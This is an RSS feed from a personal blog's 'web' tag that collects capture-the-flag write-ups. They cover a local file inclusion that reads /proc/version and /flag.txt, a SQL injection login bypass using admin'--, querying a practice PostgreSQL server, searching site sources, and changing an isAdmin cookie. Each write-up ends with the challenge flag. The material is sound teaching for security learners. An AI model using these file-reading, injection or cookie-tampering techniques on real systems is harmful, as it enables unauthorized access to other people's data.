<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>web - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/web/</link><description>web - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 04 Dec 2022 23:39:42 +0100</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/web/" rel="self" type="application/rss+xml"/><item><title>Technovate2022 - Forensics - Trail Blazer</title><link>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</link><pubDate>Sun, 04 Dec 2022 23:39:42 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/technovate2022-forensics-trail-blazer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/technovate2022.jpg" referrerpolicy="no-referrer">
            </div><h1 id="trail-blazer">Trail Blazer</h1>
<h2 id="description">description</h2>
<p>I just made <a href="http://host3.metaproblems.com:4110/" target="_blank" rel="noopener noreffer">this cool website</a> that acts as your own personal web browser!</p>
<p>Why is this cool? Well&hellip; I wrote it! Anyway, check it out and let me know if there are any
features you would like to see added!</p>
<p><strong>Hint: You just need to search for /flag.txt.</strong></p>
<h2 id="writeup">writeup</h2>
<p>upon opening the website in my browser i am presented with the following form:</p>
<p></p>
<p>If i try to input any url e.g. <a href="http://google.com" target="_blank" rel="noopener noreffer">google.com</a> I get redirected to this page: <a href="http://host3.metaproblems.com:4110/blaze.php?page=google.com" target="_blank" rel="noopener noreffer"><code>http://host3.metaproblems.com:4110/blaze.php?page=google.com</code></a></p>
<p>But I get an error:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Could not open file.
</span></span></code></pre></td></tr></table>
</div>
</div><p>So it looks like the program is including an actual single file.</p>
<p>Letâ€™s try something like: <code>/proc/version</code></p>
<p>The GET request would look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page=/proc/version
</span></span></code></pre></td></tr></table>
</div>
</div><p>And I get the following response:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Linux version 4.19.0-22-cloud-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.260-1 (2022-09-29)
</span></span></code></pre></td></tr></table>
</div>
</div><p>So that confirms that the LFI technique is in fact working.</p>
<p>Since the hint for this challenge says: <strong>You just need to search for /flag.txt</strong></p>
<p>We can just get the flag like so:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://host3.metaproblems.com:4110/blaze.php?page<span class="o">=</span>/flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MetaCTF<span class="o">{</span>blazing_paths_will_blaze_your_app_t00<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>WRECKCTF_2022 - web - sources</title><link>https://blog.ppeinecke.de/posts/wreckctf-2022-web-sources/</link><pubDate>Sat, 01 Oct 2022 18:57:31 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/wreckctf-2022-web-sources/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/wreckctf_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="wreckctf_2022---web---sources---writeup">WreckCTF_2022 - web - sources - writeup</h1>
<h2 id="description">description</h2>
<p>click to spin, search for the flag!</p>
<p>sources.challs.wreckctf.com</p>
<h2 id="writeup">writeup</h2>
<p>After going to the link <code>https://sources.challs.wreckctf.com/</code> I can get the first part of the flag by looking at the HTML code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;script.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;image.png&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- flag part 1: flag{bd6a9e3f --&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first part of our flag is <code>flag{bd6a9e3f</code></p>
<p>After looking at the file <code>https://sources.challs.wreckctf.com/style.css</code>
I get the second part of the flag!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">html</span><span class="o">,</span> <span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">display</span><span class="p">:</span> <span class="k">grid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">place-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">img</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">30</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">user-select</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">div</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">position</span><span class="p">:</span> <span class="kc">absolute</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/* flag part 2: 1690f7ab */</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the second part of the flag is <code>1690f7ab</code></p>
<p>By looking at the file <code>https://sources.challs.wreckctf.com/script.js</code> I found the third part of the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="nx">res</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">velocity</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">angle</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">time</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">element</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">animate</span> <span class="o">=</span> <span class="p">(</span><span class="nx">current</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">=</span> <span class="nx">current</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">delta</span> <span class="o">=</span> <span class="nx">current</span> <span class="o">-</span> <span class="nx">state</span><span class="p">.</span><span class="nx">time</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">angle</span> <span class="o">=</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">angle</span> <span class="o">+</span> <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">*</span> <span class="nx">delta</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">%</span> <span class="mi">360</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">transform</span> <span class="o">=</span> <span class="sb">`rotate(</span><span class="si">${</span><span class="nx">state</span><span class="p">.</span><span class="nx">angle</span><span class="si">}</span><span class="sb">deg)`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">time</span> <span class="o">=</span> <span class="nx">current</span>
</span></span><span class="line"><span class="cl">        <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">animate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">animate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">setInterval</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">velocity</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// flag part 3: b8445c0e}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>So the third part of the flag is <code>b8445c0e}</code>.</p>
<p>After piecing it together the final flag is: <code>flag{bd6a9e3f1690f7abb8445c0e}</code></p>
]]></description></item><item><title>picoCTF - Web Exploitation - SQLiLite</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</link><pubDate>Wed, 06 Apr 2022 16:12:40 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sqlilite---writeup">Web Exploitation - SQLiLite - writeup</h1>
<h2 id="description">description</h2>
<p>Can you login to this website?</p>
<p>Try to login <!-- raw HTML omitted -->here<!-- raw HTML omitted -->.</p>
<h2 id="writeup">writeup</h2>
<p>Once i visit the website <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:60431/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:60431/</a><!-- raw HTML omitted -->
in firefox I can see a login form with a username and a password field.</p>
<p>My first attempt was to use the username &lsquo;admin&rsquo;
and try a basic sql injection.</p>
<p>So I input in the username field this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;--
</span></span></code></pre></td></tr></table>
</div>
</div><p>the single quote is here to end the input of the text box.</p>
<p>The double dash (&ndash;) is here to comment out the rest of the sql query
so we can skip the password check.</p>
<p>Once I try to login using this method I get redirected to a page with the following content:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: admin&#39;--
</span></span><span class="line"><span class="cl">password: 
</span></span><span class="line"><span class="cl">SQL query: SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Logged in! But can you see the flag, it is in plainsight.
</span></span></code></pre></td></tr></table>
</div>
</div><p>But looking at the html code reveals the flag pretty quickly:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">hidden</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - SQL Direct</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</link><pubDate>Wed, 06 Apr 2022 16:10:25 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sql-direct---writeup">Web Exploitation - SQL Direct - writeup</h1>
<h2 id="description">description</h2>
<p>Connect to this PostgreSQL server and find the flag!</p>
<p>psql -h saturn.picoctf.net -p 49248 -U postgres pico</p>
<p>Password is postgres</p>
<h2 id="writeup">writeup</h2>
<p>Ok let&rsquo;s first connect to the database server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql -h saturn.picoctf.net -p <span class="m">49248</span> -U postgres pico 
</span></span></code></pre></td></tr></table>
</div>
</div><p>the password is &lsquo;postgres&rsquo;</p>
<p>Let&rsquo;s list all databases first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \l</span>
</span></span><span class="line"><span class="cl">                                 List of databases
</span></span><span class="line"><span class="cl">   Name    <span class="p">|</span>  Owner   <span class="p">|</span> Encoding <span class="p">|</span>  Collate   <span class="p">|</span>   Ctype    <span class="p">|</span>   Access privileges   
</span></span><span class="line"><span class="cl">-----------+----------+----------+------------+------------+-----------------------
</span></span><span class="line"><span class="cl"> pico      <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> postgres  <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> template0 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"> template1 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">4</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Connect to the &lsquo;pico&rsquo; database</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \c pico</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>List all tables</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \dt</span>
</span></span><span class="line"><span class="cl">         List of relations
</span></span><span class="line"><span class="cl"> Schema <span class="p">|</span> Name  <span class="p">|</span> Type  <span class="p">|</span>  Owner   
</span></span><span class="line"><span class="cl">--------+-------+-------+----------
</span></span><span class="line"><span class="cl"> public <span class="p">|</span> flags <span class="p">|</span> table <span class="p">|</span> postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">1</span> row<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>the table &lsquo;flags&rsquo; sounds interesting &hellip;</p>
<p>lets look at the contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># select * from flags;</span>
</span></span><span class="line"><span class="cl"> id <span class="p">|</span> firstname <span class="p">|</span> lastname  <span class="p">|</span>                address                 
</span></span><span class="line"><span class="cl">----+-----------+-----------+----------------------------------------
</span></span><span class="line"><span class="cl">  <span class="m">1</span> <span class="p">|</span> Luke      <span class="p">|</span> Skywalker <span class="p">|</span> picoCTF<span class="o">{</span>L3arN_S0m3_5qL_t0d4Y_a26695df<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="m">2</span> <span class="p">|</span> Leia      <span class="p">|</span> Organa    <span class="p">|</span> Alderaan
</span></span><span class="line"><span class="cl">  <span class="m">3</span> <span class="p">|</span> Han       <span class="p">|</span> Solo      <span class="p">|</span> Corellia
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">3</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is our flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L3arN_S0m3_5qL_t0d4Y_a26695df}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Search source</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</link><pubDate>Wed, 06 Apr 2022 16:08:45 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---search-source---writeup">Web Exploitation - Search Source - writeup</h1>
<h2 id="description">description</h2>
<p>The developer of this website mistakenly left an
important artifact in the website source, can you find it?
The website is <!-- raw HTML omitted -->here<!-- raw HTML omitted --></p>
<h2 id="writeup">writeup</h2>
<p>I was not able to find anything interesting on the website
by just looking at the source code in the browser.</p>
<p>So let&rsquo;s clone the website first using HTTrack so we can
take a look at the full source.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">httrack http://saturn.picoctf.net:64200/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s use grep recursively to find the flag inside all
of the files of the webroot.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -nr <span class="s1">&#39;picoCTF*&#39;</span> .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./css/style.css:328:/** banner_main picoCTF<span class="o">{</span>1nsp3ti0n_0f_w3bpag3s_3003ba70<span class="o">}</span> **/
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found the flag inside the file css/style.css on line 328.</p>
<p>Flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nsp3ti0n_0f_w3bpag3s_3003ba70}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Power Cookie</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</link><pubDate>Wed, 06 Apr 2022 16:04:26 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---power-cookie---writeup">Web Exploitation - Power Cookie - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag? Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted -->
and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Looking at the check.php function I can see that it requests a cookie &lsquo;isAdmin&rsquo;.</p>
<p>That cookie is not present at the first visit of the page.</p>
<p>So lets refresh the webpage.</p>
<p>Now the cookie is present.</p>
<p>The value of this particuluar cookie is &lsquo;0&rsquo; currently.</p>
<p>So lets change it to &lsquo;1&rsquo; and refresh the page once more.</p>
<p>I am immediately presented with the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{gr4d3_A_c00k13_1d871e17}
</span></span></code></pre></td></tr></table>
</div>
